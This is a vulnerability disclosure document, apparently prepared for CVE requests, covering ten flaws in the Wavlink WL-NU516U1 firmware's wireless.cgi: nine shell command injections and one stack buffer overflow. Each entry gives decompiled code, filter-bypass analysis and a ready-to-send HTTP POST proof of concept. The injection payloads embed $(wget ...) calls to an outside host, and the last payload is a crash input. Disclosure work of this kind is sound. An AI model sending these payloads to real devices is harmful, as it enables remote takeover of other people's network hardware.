# Wavlink WL-NU516U1 CVE Application Materials

## Common Fields
- Vendor: Wavlink
- Product: WL-NU516U1
- Version: M16U1_V240425
- Firmware Download: https://docs.wavlink.xyz/Firmware/?category=USB+Printer+Server&model=WL-NU516U1-A
- Advisory: https://github.com/Svigo-o/Wavlink_vul
- Binary: /cgi-bin/wireless.cgi (MIPS little-endian, stripped)
- Architecture: MIPS 74Kf, Linux 3.2.0 (Debian Wheezy)

---

## 1. GuestWifi Guest_password Command Injection

**Class:** Command Injection (CWE-78)

**Root Cause:**
The vulnerability exists in the GuestWifi handler function `sub_4032E4` of `/cgi-bin/wireless.cgi`. When the HTTP POST parameter `page` is set to `GuestWifi`, the main routing function `ftext` dispatches execution to `sub_4032E4`.

The function reads the `Guest_password` POST parameter via `sub_405EA8` (URL decode function). The `sub_405EA8` function performs URL percent-decoding (e.g., `%20` to space) but does NOT perform any sanitization or escaping of shell metacharacters.

The decoded value is then passed as the third argument to `sub_407504("rai1", "WPAPSK", decoded_password)`. The function `sub_407504` (iwpriv_cmd) constructs a shell command using sprintf without bounds checking:

```c
int sub_407504(const char *a1, const char *a2, const char *a3) {
    char v8[1028];
    memset(v8, 0, 1024);
    sprintf(v8, "iwpriv %s set %s=\"%s\"", a1, a2, a3);
    system(v8);
}
```

The resulting command is: `iwpriv rai1 set WPAPSK="<user_input>"` which is passed directly to `system()`.

**Input Filter Analysis:**
The function `sub_4074A0` is called before `sub_407504` to filter the input. This filter checks each character of the input and only blocks:
- Backtick character (ASCII 96, `` ` ``)
- Pipe character (ASCII 124, `|`)

The filter does NOT block:
- `$()` (command substitution syntax)
- `;` (command separator)
- `&&` (logical AND operator)

Therefore, an attacker can use `$(arbitrary_command)` syntax to inject commands. The shell will execute the command inside `$()` before passing the result to `iwpriv`.

**Conditions:**
- `guestEn=1` (guest network must be enabled)
- `Authentication_Mode=2` (non-OPEN mode, e.g., WPA2PSK)

**PoC:**
```http
POST /cgi-bin/wireless.cgi HTTP/1.1
Host: 192.168.6.3
Content-Type: application/x-www-form-urlencoded
Referer: http://192.168.6.3/
Connection: close
Content-Length: 96

page=GuestWifi&guestEn=1&Authentication_Mode=2&Guest_password=$(wget http://192.168.6.1:6666/guest_pw)
```

**Advisory:** https://github.com/Svigo-o/Wavlink_vul/tree/main/wavlink-wl-nu516u1-wireless-guestwifi-guestpassword-command-injection

---

## 2. DeleteMac delete_al_mac Command Injection

**Class:** Command Injection (CWE-78)

**Root Cause:**
The vulnerability exists in the DeleteMac handler function `sub_402D1C` of `/cgi-bin/wireless.cgi`. When the HTTP POST parameter `page` is set to `DeleteMac`, the main routing function `ftext` dispatches execution to `sub_402D1C`.

The function reads four POST parameters via `sub_405EA8` (URL decode function):
- `delete_list` → variable `v4`
- `delete_al_mac` → variable `v6`
- `b_delete_list` → variable `v8`
- `b_delete_al_mac` → variable `v10`

These four parameters are concatenated into a shell command using sprintf:

```c
sprintf(v20, "/etc/lighttpd/www/cgi-bin/del_mac.sh y%s y%s y%s y%s &", v4, v6, v8, v10);
sub_405314(v20);
```

The function `sub_405314` is a wrapper that calls `system()` to execute the constructed command. The resulting command is: `/etc/lighttpd/www/cgi-bin/del_mac.sh y<delete_list> y<delete_al_mac> y<b_delete_list> y<b_delete_al_mac> &`

The `delete_al_mac` parameter (variable `v6`, 2nd argument in the sprintf call) is passed directly to the shell command without any sanitization. No input filter function (`sub_4074A0`) is called in the DeleteMac handler, unlike the GuestWifi handler. Since the shell interprets `$()` command substitution before executing the command, an attacker can inject arbitrary commands by placing `$(command)` in the `delete_al_mac` parameter.

**PoC:**
```http
POST /cgi-bin/wireless.cgi HTTP/1.1
Host: 192.168.6.3
Content-Type: application/x-www-form-urlencoded
Referer: http://192.168.6.3/
Connection: close
Content-Length: 82

page=DeleteMac&delete_list=AA&delete_al_mac=$(wget http://192.168.6.1:6666/del_al)
```

**Advisory:** https://github.com/Svigo-o/Wavlink_vul/tree/main/wavlink-wl-nu516u1-wireless-deletemac-deletealmac-command-injection

---

## 3. DeleteMac b_delete_list Command Injection

**Class:** Command Injection (CWE-78)

**Root Cause:**
The vulnerability exists in the DeleteMac handler function `sub_402D1C` of `/cgi-bin/wireless.cgi`. When the HTTP POST parameter `page` is set to `DeleteMac`, the main routing function `ftext` dispatches execution to `sub_402D1C`.

The function reads four POST parameters via `sub_405EA8` (URL decode function):
- `delete_list` → variable `v4`
- `delete_al_mac` → variable `v6`
- `b_delete_list` → variable `v8`
- `b_delete_al_mac` → variable `v10`

These four parameters are concatenated into a shell command using sprintf:

```c
sprintf(v20, "/etc/lighttpd/www/cgi-bin/del_mac.sh y%s y%s y%s y%s &", v4, v6, v8, v10);
sub_405314(v20);
```

The function `sub_405314` is a wrapper that calls `system()` to execute the constructed command. The resulting command is: `/etc/lighttpd/www/cgi-bin/del_mac.sh y<delete_list> y<delete_al_mac> y<b_delete_list> y<b_delete_al_mac> &`

The `b_delete_list` parameter (variable `v8`, 3rd argument in the sprintf call) is passed directly to the shell command without any sanitization. No input filter function (`sub_4074A0`) is called in the DeleteMac handler. Since the shell interprets `$()` command substitution before executing the command, an attacker can inject arbitrary commands by placing `$(command)` in the `b_delete_list` parameter.

**PoC:**
```http
POST /cgi-bin/wireless.cgi HTTP/1.1
Host: 192.168.6.3
Content-Type: application/x-www-form-urlencoded
Referer: http://192.168.6.3/
Connection: close
Content-Length: 95

page=DeleteMac&delete_list=AA&delete_al_mac=BB&b_delete_list=$(wget http://192.168.6.1:6666/b_del)
```

**Advisory:** https://github.com/Svigo-o/Wavlink_vul/tree/main/wavlink-wl-nu516u1-wireless-deletemac-bdeletelist-command-injection

---

## 4. DeleteMac b_delete_al_mac Command Injection

**Class:** Command Injection (CWE-78)

**Root Cause:**
The vulnerability exists in the DeleteMac handler function `sub_402D1C` of `/cgi-bin/wireless.cgi`. When the HTTP POST parameter `page` is set to `DeleteMac`, the main routing function `ftext` dispatches execution to `sub_402D1C`.

The function reads four POST parameters via `sub_405EA8` (URL decode function):
- `delete_list` → variable `v4`
- `delete_al_mac` → variable `v6`
- `b_delete_list` → variable `v8`
- `b_delete_al_mac` → variable `v10`

These four parameters are concatenated into a shell command using sprintf:

```c
sprintf(v20, "/etc/lighttpd/www/cgi-bin/del_mac.sh y%s y%s y%s y%s &", v4, v6, v8, v10);
sub_405314(v20);
```

The function `sub_405314` is a wrapper that calls `system()` to execute the constructed command. The resulting command is: `/etc/lighttpd/www/cgi-bin/del_mac.sh y<delete_list> y<delete_al_mac> y<b_delete_list> y<b_delete_al_mac> &`

The `b_delete_al_mac` parameter (variable `v10`, 4th argument in the sprintf call) is passed directly to the shell command without any sanitization. No input filter function (`sub_4074A0`) is called in the DeleteMac handler. Since the shell interprets `$()` command substitution before executing the command, an attacker can inject arbitrary commands by placing `$(command)` in the `b_delete_al_mac` parameter.

**PoC:**
```http
POST /cgi-bin/wireless.cgi HTTP/1.1
Host: 192.168.6.3
Content-Type: application/x-www-form-urlencoded
Referer: http://192.168.6.3/
Connection: close
Content-Length: 110

page=DeleteMac&delete_list=AA&delete_al_mac=BB&b_delete_list=CC&b_delete_al_mac=$(wget http://192.168.6.1:6666/b_al)
```

**Advisory:** https://github.com/Svigo-o/Wavlink_vul/tree/main/wavlink-wl-nu516u1-wireless-deletemac-bdeletealmac-command-injection

---

## 5. SetName NewName Command Injection

**Class:** Command Injection (CWE-78)

**Root Cause:**
The vulnerability exists in the SetName handler function `sub_403198` of `/cgi-bin/wireless.cgi`. When the HTTP POST parameter `page` is set to `SetName`, the main routing function `ftext` dispatches execution to `sub_403198`.

The function reads two POST parameters via `sub_405EA8` (URL decode function):
- `mac_5g` → variable `v4`
- `NewName` → variable `v7`

These two parameters are concatenated into a shell command using sprintf:

```c
sprintf(v14, "/etc/lighttpd/www/cgi-bin/change_name.sh %s %s &", v4, v7);
sub_405314(v14);
```

The function `sub_405314` is a wrapper that calls `system()` to execute the constructed command. The resulting command is: `/etc/lighttpd/www/cgi-bin/change_name.sh <mac_5g> <NewName> &`

The `NewName` parameter (variable `v7`, 2nd argument in the sprintf call) is passed directly to the shell command without any sanitization. No input filter function (`sub_4074A0`) is called in the SetName handler. Since the shell interprets `$()` command substitution before executing the command, an attacker can inject arbitrary commands by placing `$(command)` in the `NewName` parameter.

**PoC:**
```http
POST /cgi-bin/wireless.cgi HTTP/1.1
Host: 192.168.6.3
Content-Type: application/x-www-form-urlencoded
Referer: http://192.168.6.3/
Connection: close
Content-Length: 62

page=SetName&mac_5g=AA:BB:CC:DD:EE:FF&NewName=$(wget http://192.168.6.1:6666/newname)
```

**Advisory:** https://github.com/Svigo-o/Wavlink_vul/tree/main/wavlink-wl-nu516u1-wireless-setname-newname-command-injection

---

## 6. multi_ssid SSID2G2 Command Injection

**Class:** Command Injection (CWE-78)

**Root Cause:**
The vulnerability exists in the multi_ssid handler function `sub_401D68` of `/cgi-bin/wireless.cgi`. When the HTTP POST parameter `page` is set to `multi_ssid`, the main routing function `ftext` dispatches execution to `sub_401D68`.

The function reads the `SSID2G2` POST parameter via `sub_405EA8` (URL decode function) and stores it in variable `v8`. The decoded value is then used in multiple sprintf+system calls to configure the multi-SSID wireless interface:

```c
sprintf(v30, "%s_Touch", v8);  // Append "_Touch" suffix to SSID
sprintf(v29, "set_bss.sh set 2 \"%s_Touch\" OPEN NONE Admin12345", v30);
system(v29);
sprintf(v29, "set_bss.sh set 6 \"%s_Touch\" OPEN NONE Admin12345", v30);
system(v29);
```

The function `sub_405314` (called via `system()`) executes the constructed commands. The resulting commands are:
- `set_bss.sh set 2 "<SSID2G2>_Touch" OPEN NONE Admin12345`
- `set_bss.sh set 6 "<SSID2G2>_Touch" OPEN NONE Admin12345`

The `SSID2G2` value is embedded in the command string without sanitization. The input filter function `sub_4074A0` is called but only blocks backtick (`` ` ``) and pipe (`|`) characters. The `$(cmd)` command substitution syntax is not filtered, allowing an attacker to inject arbitrary commands.

**PoC:**
```http
POST /cgi-bin/wireless.cgi HTTP/1.1
Host: 192.168.6.3
Content-Type: application/x-www-form-urlencoded
Referer: http://192.168.6.3/
Connection: close
Content-Length: 106

page=multi_ssid&wifi_multi_ssid=1&SSID2G2=$(wget http://192.168.6.1:6666/ssid2g2)&AuthMethod2=OPEN&EncrypType2=NONE
```

**Advisory:** https://github.com/Svigo-o/Wavlink_vul/tree/main/wavlink-wl-nu516u1-wireless-multissid-ssid2g2-command-injection

---

## 7. multi_ssid SSID5G2 Command Injection

**Class:** Command Injection (CWE-78)

**Root Cause:**
The vulnerability exists in the multi_ssid handler function `sub_401D68` of `/cgi-bin/wireless.cgi`. When the HTTP POST parameter `page` is set to `multi_ssid`, the main routing function `ftext` dispatches execution to `sub_401D68`.

The function reads the `SSID5G2` POST parameter via `sub_405EA8` (URL decode function) and stores it in variable `v8`. The decoded value is then used in multiple sprintf+system calls to configure the multi-SSID wireless interface:

```c
sprintf(v30, "%s_Touch", v8);  // Append "_Touch" suffix to SSID
sprintf(v29, "set_bss.sh set 2 \"%s_Touch\" OPEN NONE Admin12345", v30);
system(v29);
sprintf(v29, "set_bss.sh set 6 \"%s_Touch\" OPEN NONE Admin12345", v30);
system(v29);
```

The function `sub_405314` (called via `system()`) executes the constructed commands. The resulting commands are:
- `set_bss.sh set 2 "<SSID5G2>_Touch" OPEN NONE Admin12345`
- `set_bss.sh set 6 "<SSID5G2>_Touch" OPEN NONE Admin12345`

The `SSID5G2` value is embedded in the command string without sanitization. The input filter function `sub_4074A0` is called but only blocks backtick (`` ` ``) and pipe (`|`) characters. The `$(cmd)` command substitution syntax is not filtered, allowing an attacker to inject arbitrary commands.

**PoC:**
```http
POST /cgi-bin/wireless.cgi HTTP/1.1
Host: 192.168.6.3
Content-Type: application/x-www-form-urlencoded
Referer: http://192.168.6.3/
Connection: close
Content-Length: 106

page=multi_ssid&wifi_multi_ssid=1&SSID5G2=$(wget http://192.168.6.1:6666/ssid5g2)&AuthMethod2=OPEN&EncrypType2=NONE
```

**Advisory:** https://github.com/Svigo-o/Wavlink_vul/tree/main/wavlink-wl-nu516u1-wireless-multissid-ssid5g2-command-injection

---

## 8. multi_ssid AuthMethod2 Command Injection

**Class:** Command Injection (CWE-78)

**Root Cause:**
The vulnerability exists in the multi_ssid handler function `sub_401D68` of `/cgi-bin/wireless.cgi`. When the HTTP POST parameter `page` is set to `multi_ssid`, the main routing function `ftext` dispatches execution to `sub_401D68`.

The function reads the `AuthMethod2` POST parameter via `sub_405EA8` (URL decode function) and stores it in a local variable. The decoded value is then used in sprintf+system calls to configure the authentication method of the multi-SSID wireless interface:

```c
sprintf(v29, "set_bss.sh set 2 \"%s_Touch\" %s %s Admin12345", v30, v_authmethod, v_encryptype);
system(v29);
sprintf(v29, "set_bss.sh set 6 \"%s_Touch\" %s %s Admin12345", v30, v_authmethod, v_encryptype);
system(v29);
```

Where `v_authmethod` is the decoded value of `AuthMethod2`. The function `sub_405314` (called via `system()`) executes the constructed commands. The resulting commands are:
- `set_bss.sh set 2 "<SSID>_Touch" <AuthMethod2> <EncrypType> Admin12345`
- `set_bss.sh set 6 "<SSID>_Touch" <AuthMethod2> <EncrypType> Admin12345`

The `AuthMethod2` value replaces the `OPEN` placeholder in the command. The input filter function `sub_4074A0` is called but only blocks backtick (`` ` ``) and pipe (`|`) characters. The `$(cmd)` command substitution syntax is not filtered, allowing an attacker to inject arbitrary commands.

**PoC:**
```http
POST /cgi-bin/wireless.cgi HTTP/1.1
Host: 192.168.6.3
Content-Type: application/x-www-form-urlencoded
Referer: http://192.168.6.3/
Connection: close
Content-Length: 112

page=multi_ssid&wifi_multi_ssid=1&SSID2G2=TestSSID&AuthMethod2=$(wget http://192.168.6.1:6666/auth2)&EncrypType2=NONE
```

**Advisory:** https://github.com/Svigo-o/Wavlink_vul/tree/main/wavlink-wl-nu516u1-wireless-multissid-authmethod2-command-injection

---

## 9. multi_ssid WPAPSK12 Command Injection

**Class:** Command Injection (CWE-78)

**Root Cause:**
The vulnerability exists in the multi_ssid handler function `sub_401D68` of `/cgi-bin/wireless.cgi`. When the HTTP POST parameter `page` is set to `multi_ssid`, the main routing function `ftext` dispatches execution to `sub_401D68`.

The function reads the `WPAPSK12` POST parameter via `sub_405EA8` (URL decode function) and stores it in a local variable. The decoded value is then used in sprintf+system calls to configure the WPA pre-shared key of the multi-SSID wireless interface:

```c
sprintf(v29, "set_bss.sh set 2 \"%s_Touch\" %s %s %s", v30, v_authmethod, v_encryptype, v_wpapsk);
system(v29);
sprintf(v29, "set_bss.sh set 6 \"%s_Touch\" %s %s %s", v30, v_authmethod, v_encryptype, v_wpapsk);
system(v29);
```

Where `v_wpapsk` is the decoded value of `WPAPSK12`. The function `sub_405314` (called via `system()`) executes the constructed commands. The resulting commands are:
- `set_bss.sh set 2 "<SSID>_Touch" <AuthMethod> <EncrypType> <WPAPSK12>`
- `set_bss.sh set 6 "<SSID>_Touch" <AuthMethod> <EncrypType> <WPAPSK12>`

The `WPAPSK12` value is the WPA pre-shared key in the command. The input filter function `sub_4074A0` is called but only blocks backtick (`` ` ``) and pipe (`|`) characters. The `$(cmd)` command substitution syntax is not filtered, allowing an attacker to inject arbitrary commands.

**PoC:**
```http
POST /cgi-bin/wireless.cgi HTTP/1.1
Host: 192.168.6.3
Content-Type: application/x-www-form-urlencoded
Referer: http://192.168.6.3/
Connection: close
Content-Length: 126

page=multi_ssid&wifi_multi_ssid=1&SSID2G2=TestSSID&AuthMethod2=WPA2PSK&EncrypType2=AES&WPAPSK12=$(wget http://192.168.6.1:6666/wpa12)
```

**Advisory:** https://github.com/Svigo-o/Wavlink_vul/tree/main/wavlink-wl-nu516u1-wireless-multissid-wpapsk12-command-injection

---

## 10. GuestWifi Guest_ssid Buffer Overflow

**Class:** Buffer Overflow (CWE-120)

**Root Cause:**
The vulnerability exists in the `sub_407504` function (iwpriv_cmd) of `/cgi-bin/wireless.cgi`, which is called by the GuestWifi handler function `sub_4032E4`.

The function `sub_407504` allocates a 1028-byte stack buffer and uses sprintf to construct a shell command without bounds checking:

```c
int sub_407504(const char *a1, const char *a2, const char *a3) {
    char v8[1028];  // Stack buffer: 1028 bytes
    memset(v8, 0, 1024);
    sprintf(v8, "iwpriv %s set %s=\"%s\"", a1, a2, a3);
    // ... no bounds check ...
    system(v8);
}
```

The format string `"iwpriv %s set %s=\"%s\""` is 22 characters (including quotes and null terminator). When `strlen(a1) + strlen(a2) + strlen(a3) + 22 > 1028`, the sprintf overflows the stack buffer `v8`.

In the GuestWifi handler `sub_4032E4`, the `Guest_ssid` POST parameter (variable `v15`) is read via `sub_405EA8` and passed as `a3` to `sub_407504("rai0", "SSID", v15)`. The `a1` parameter is "rai0" (4 bytes) and `a2` is "SSID" (4 bytes).

The total overflow threshold is: `4 + 4 + strlen(Guest_ssid) + 22 > 1028`, which means `strlen(Guest_ssid) > 998` bytes.

When the payload exceeds this threshold, the sprintf overwrites the stack buffer and corrupts the saved return address (`$ra` register in MIPS). On the MIPS architecture, the return address is stored on the stack and is used by the `jr $ra` instruction to return from the function. By controlling the overwritten value, an attacker can redirect execution to an arbitrary address.

**Stack Layout (MIPS):**
```
[local variables] [saved $ra] [saved $fp] [arguments]
      v8[1028]       4 bytes    4 bytes
```

The overflow starts at `v8` and can overwrite `saved $ra` at offset 1028-1032.

**PoC (crash):**
```http
POST /cgi-bin/wireless.cgi HTTP/1.1
Host: 192.168.6.3
Content-Type: application/x-www-form-urlencoded
Referer: http://192.168.6.3/
Connection: close
Content-Length: 1120

page=GuestWifi&guestEn=1&Authentication_Mode=2&Guest_ssid=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

**Advisory:** https://github.com/Svigo-o/Wavlink_vul/tree/main/wavlink-wl-nu516u1-wireless-guestwifi-guestssid-buffer-overflow
